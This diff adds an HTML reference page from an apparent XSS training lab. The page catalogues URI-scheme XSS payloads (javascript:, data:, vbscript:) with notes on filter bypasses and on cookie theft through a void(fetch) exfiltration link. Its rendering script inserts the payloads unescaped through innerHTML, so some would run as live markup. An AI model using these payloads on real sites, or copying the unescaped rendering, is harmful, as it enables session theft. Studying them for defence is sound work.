@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>URI Scheme Reference | XSS Mastery</title>
+  <style>
+    :root{--bg:#0b0f1a;--bg2:#111827;--card:#141c2e;--border:#1e3a5f;
+          --gold:#f5c842;--cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;
+          --green:#4ade80;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf}
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:-apple-system,sans-serif;padding:32px}
+    .wrap{max-width:900px;margin:0 auto}
+    h1{font-size:26px;color:var(--gold);margin-bottom:6px}
+    .subtitle{color:var(--muted);font-size:13px;margin-bottom:28px}
+    .search-bar{display:flex;gap:10px;margin-bottom:24px}
+    .search-bar input{flex:1;padding:10px 14px;background:var(--card);
+      border:1px solid var(--border);border-radius:6px;color:var(--text);font-size:14px}
+    .search-bar input:focus{outline:none;border-color:var(--cyan)}
+    .filters{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:20px}
+    .filter-btn{padding:5px 12px;border-radius:20px;border:1px solid var(--border);
+      background:transparent;color:var(--muted);font-size:12px;cursor:pointer;font-weight:600}
+    .filter-btn.active{border-color:var(--cyan);color:var(--cyan);background:#061826}
+    .entry{background:var(--card);border:1px solid var(--border);border-radius:6px;
+           padding:16px 18px;margin-bottom:10px}
+    .entry-header{display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:8px}
+    .entry-scheme{font-family:'Courier New',monospace;font-size:15px;
+                  color:var(--orange);font-weight:700}
+    .badges{display:flex;gap:6px;flex-wrap:wrap}
+    .badge{font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;
+           letter-spacing:.06em}
+    .badge-zero{background:#1f0a0a;color:var(--red);border:1px solid #5a1515}
+    .badge-click{background:#1a1a10;color:var(--gold);border:1px solid #5a5010}
+    .badge-attr{background:#0a1f3a;color:var(--cyan);border:1px solid #1e3a5f}
+    .badge-dom{background:#1a0a2e;color:var(--purple);border:1px solid #3a1a5f}
+    .badge-legacy{background:#1a1a1a;color:#6b7280;border:1px solid #374151}
+    .entry-payload{font-family:'Courier New',monospace;font-size:12px;
+                   color:var(--orange);background:#060d1a;padding:8px 10px;
+                   border-radius:4px;margin:8px 0;word-break:break-all}
+    .entry-note{font-size:13px;color:var(--muted);line-height:1.55}
+    .entry-attrs{font-size:11.5px;color:var(--purple);margin-top:6px}
+    .count{font-size:12px;color:var(--muted);margin-bottom:14px}
+    code{font-family:'Courier New',monospace;font-size:11.5px;background:#060d1a;
+         color:var(--cyan);padding:1px 4px;border-radius:2px}
+    .nav{display:flex;justify-content:space-between;font-size:13px;
+         color:var(--muted);margin-bottom:24px}
+    .nav a{color:var(--cyan);text-decoration:none}
+  </style>
+</head>
+<body>
+<div class="wrap">
+  <nav class="nav">
+    <a href="/">← Lab Home</a>
+    <span>URI Scheme Reference — Module 06</span>
+    <a href="/attack_03_uri.html">Attack Demo →</a>
+  </nav>
+
+  <h1>URI Scheme XSS Reference</h1>
+  <p class="subtitle">
+    Every URI scheme that can execute JavaScript or render attacker-controlled HTML,
+    organized by mechanism and interaction requirement.
+  </p>
+
+  <div class="search-bar">
+    <input type="text" id="search" placeholder="Search scheme, attribute, or technique…" oninput="filterEntries()">
+  </div>
+
+  <div class="filters">
+    <button class="filter-btn active" onclick="setFilter('all',this)">All</button>
+    <button class="filter-btn" onclick="setFilter('zero',this)">Zero Interaction</button>
+    <button class="filter-btn" onclick="setFilter('click',this)">Requires Click</button>
+    <button class="filter-btn" onclick="setFilter('dom',this)">DOM Sink</button>
+    <button class="filter-btn" onclick="setFilter('legacy',this)">Legacy / IE</button>
+  </div>
+
+  <div class="count" id="count"></div>
+  <div id="entries"></div>
+</div>
+
+<script>
+const entries = [
+  {
+    scheme: "javascript:",
+    badges: ["click"],
+    attrs: ["href (a, area)", "action (form)", "formaction (input/button)"],
+    payload: '<a href="javascript:alert(document.cookie)">Click me</a>',
+    note: "The canonical URI-scheme XSS vector. Browsers evaluate the expression in the origin of the current page when the user activates the link. Case-insensitive; tolerates leading whitespace characters (U+0009 tab, U+000A newline, U+000D CR).",
+  },
+  {
+    scheme: "javascript: (auto via location)",
+    badges: ["zero", "dom"],
+    attrs: ["location", "location.href", "location.replace()", "location.assign()"],
+    payload: "location.href = userInput; // if userInput = 'javascript:alert(1)'",
+    note: "When attacker-controlled data reaches any location assignment, javascript: executes immediately. Zero user interaction — no click required. Most common DOM XSS pattern in the wild. Also applies to window.open() and document.open().",
+  },
+  {
+    scheme: "javascript: (open redirect)",
+    badges: ["click"],
+    attrs: ["Location header (HTTP 3xx)"],
+    payload: "GET /redirect?url=javascript:alert(origin) → 302 Location: javascript:alert(origin)",
+    note: "Open redirect endpoints that reflect url= into the Location header without scheme validation allow attackers to turn any 'safe' redirect into a javascript: execution. The browser follows the Location header and executes the scheme.",
+  },
+  {
+    scheme: "data:text/html",
+    badges: ["zero"],
+    attrs: ["src (iframe)", "data (object)", "href (a)", "location"],
+    payload: '<iframe src="data:text/html,<script>alert(1)<\/script>"></iframe>',
+    note: "Creates a full HTML document inline. Scripts in data: iframes execute in a null origin — they cannot directly access the parent's cookies or storage, but they can send requests with credentials (if CORS is permissive) and can render convincing phishing overlays. When used via location= they execute in a null origin.",
+  },
+  {
+    scheme: "data:text/html (base64)",
+    badges: ["zero"],
+    attrs: ["src (iframe)", "href (a)"],
+    payload: '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>',
+    note: "Base64-encoded variant of data:text/html. Bypasses filters that check for literal '<script>' or 'alert' strings. The browser decodes before rendering. Widely used to evade naive content filters.",
+  },
+  {
+    scheme: "javascript: (entity encoded)",
+    badges: ["click"],
+    attrs: ["href (a, area)"],
+    payload: '<a href="&#106;avascript:alert(1)">link</a>',
+    note: "HTML entity encoding in the scheme portion of an href. Browsers decode HTML entities before evaluating the href scheme. The filter must decode HTML entities before checking for 'javascript:' — most naive filters do not.",
+  },
+  {
+    scheme: "javascript: (tab/newline prefix)",
+    badges: ["click"],
+    attrs: ["href (a, area)", "location"],
+    payload: '<a href="&#9;javascript:alert(1)">link</a>',
+    note: "Leading whitespace characters (tab U+0009, newline U+000A, carriage return U+000D) before the scheme are stripped by the browser URL parser before scheme evaluation. Bypasses filters that do simple string matching without stripping leading whitespace first.",
+  },
+  {
+    scheme: "javascript: (uppercase)",
+    badges: ["click"],
+    attrs: ["href (a, area)", "location"],
+    payload: '<a href="JAVASCRIPT:alert(1)">link</a>',
+    note: "Scheme comparison is case-insensitive per RFC 3986. JAVASCRIPT:, Javascript:, jAvAsCrIpT: all work. Filters must normalize to lowercase before comparing. Most modern sanitisers handle this; many custom filters do not.",
+  },
+  {
+    scheme: "javascript: (void operator)",
+    badges: ["click"],
+    attrs: ["href (a, area)"],
+    payload: '<a href="javascript:void(fetch(\'/exfil?c=\'+document.cookie))">link</a>',
+    note: "void(expression) evaluates expression for side effects and returns undefined. The undefined return prevents navigation (which would change the page). Used by attackers to trigger side effects (exfil, CSRF token theft) while keeping the user on the same page.",
+  },
+  {
+    scheme: "javascript: (multiline)",
+    badges: ["click"],
+    attrs: ["href (a, area)"],
+    payload: 'javascript:\nalert\n(1)',
+    note: "Newlines inside the expression itself (after the colon) are valid JavaScript whitespace. The expression is parsed across multiple lines. Bypasses filters that match single-line regex patterns.",
+  },
+  {
+    scheme: "data:application/javascript",
+    badges: ["zero", "legacy"],
+    attrs: ["src (script) — legacy browsers only"],
+    payload: '<script src="data:application/javascript,alert(1)"></script>',
+    note: "Modern browsers (Chrome 18+, Firefox 67+) block data: URIs in script src by default. Still works in some legacy or misconfigured environments. Included for completeness in threat modelling historical attack surfaces.",
+  },
+  {
+    scheme: "vbscript:",
+    badges: ["click", "legacy"],
+    attrs: ["href (a)", "action (form)"],
+    payload: '<a href="vbscript:msgbox(1)">link</a>',
+    note: "VBScript URI scheme — executes VBScript code in Internet Explorer only. Not relevant to modern browsers but still appears in threat models for IE-based enterprise applications (Intranet zones, embedded WebViews in old Windows apps).",
+  },
+  {
+    scheme: "javascript: (svg xlink:href)",
+    badges: ["zero", "legacy"],
+    attrs: ["xlink:href (SVG use, SVG image)"],
+    payload: '<svg><use xlink:href="javascript:alert(1)"/></svg>',
+    note: "xlink:href on SVG elements accepts URI values including javascript:. In modern browsers this fires on click or interaction; in older browsers it could fire automatically. The SVG namespace provides a separate injection surface that many HTML-focused filters miss.",
+  },
+  {
+    scheme: "javascript: (img dynsrc/lowsrc)",
+    badges: ["zero", "legacy"],
+    attrs: ["dynsrc (img — IE)", "lowsrc (img — IE)"],
+    payload: '<img dynsrc="javascript:alert(1)">',
+    note: "IE-specific attributes that accept URLs. Both fire automatically on page load in Internet Explorer. Not applicable to modern browsers. Relevant if threat model includes IE11 (still used in enterprise environments until 2022 extended support).",
+  },
+  {
+    scheme: "javascript: (form action)",
+    badges: ["click"],
+    attrs: ["action (form)", "formaction (input[type=submit], button[type=submit])"],
+    payload: '<form action="javascript:alert(document.cookie)"><button>Submit</button></form>',
+    note: "Form action with javascript: scheme executes on submit. formaction on a specific button overrides the form-level action. Useful when the attacker can inject attributes into a button or input field but not replace the form tag itself.",
+  },
+  {
+    scheme: "javascript: (iframe src — limited)",
+    badges: ["zero"],
+    attrs: ["src (iframe)"],
+    payload: '<iframe src="javascript:alert(document.domain)"></iframe>',
+    note: "javascript: as iframe src executes in the parent's origin in some browsers. Behaviour varies: Chrome executes it, Firefox blocks it. When it works, the script has full same-origin access to the parent's DOM, cookies, and localStorage. More reliable than data: for same-origin access.",
+  },
+  {
+    scheme: "javascript: (meta refresh)",
+    badges: ["zero"],
+    attrs: ["content (meta http-equiv=refresh)"],
+    payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
+    note: "Meta refresh with javascript: URL executes after the specified delay (0 = immediately). Blocked in most modern browsers by CSP and browser heuristics, but a useful fallback when CSP is absent. Fires without any user interaction.",
+  },
+  {
+    scheme: "javascript: (object data)",
+    badges: ["zero"],
+    attrs: ["data (object element)"],
+    payload: '<object data="javascript:alert(1)"></object>',
+    note: "The object element's data attribute specifies the resource to load. When javascript: is used, older browsers execute it. Modern browsers block this. Relevant for legacy browser threat models and some mobile WebViews.",
+  },
+];
+
+let activeFilter = "all";
+
+function renderEntries(list) {
+  const container = document.getElementById("entries");
+  document.getElementById("count").textContent = `Showing ${list.length} of ${entries.length} entries`;
+  container.innerHTML = list.map(e => {
+    const badgeHtml = e.badges.map(b => {
+      const cls = b === "zero" ? "badge-zero" : b === "click" ? "badge-click" : b === "dom" ? "badge-dom" : "badge-legacy";
+      const label = b === "zero" ? "ZERO INTERACTION" : b === "click" ? "REQUIRES CLICK" : b === "dom" ? "DOM SINK" : "LEGACY";
+      return `<span class="badge ${cls}">${label}</span>`;
+    }).join("");
+    const attrHtml = e.attrs.map(a => `<code>${a}</code>`).join(" · ");
+    return `<div class="entry" data-badges="${e.badges.join(" ")}" data-text="${(e.scheme+e.note+e.attrs.join(" ")).toLowerCase()}">
+      <div class="entry-header">
+        <div class="entry-scheme">${e.scheme}</div>
+        <div class="badges">${badgeHtml}</div>
+      </div>
+      <div class="entry-payload">${e.payload}</div>
+      <div class="entry-note">${e.note}</div>
+      <div class="entry-attrs" style="margin-top:8px">Applicable to: ${attrHtml}</div>
+    </div>`;
+  }).join("");
+}
+
+function filterEntries() {
+  const q = document.getElementById("search").value.toLowerCase();
+  let filtered = entries.filter(e => {
+    const text = (e.scheme + e.note + e.attrs.join(" ") + e.payload).toLowerCase();
+    const matchSearch = !q || text.includes(q);
+    const matchFilter = activeFilter === "all" || e.badges.includes(activeFilter);
+    return matchSearch && matchFilter;
+  });
+  renderEntries(filtered);
+}
+
+function setFilter(f, btn) {
+  activeFilter = f;
+  document.querySelectorAll(".filter-btn").forEach(b => b.classList.remove("active"));
+  btn.classList.add("active");
+  filterEntries();
+}
+
+renderEntries(entries);
+</script>
+</body>
+</html>
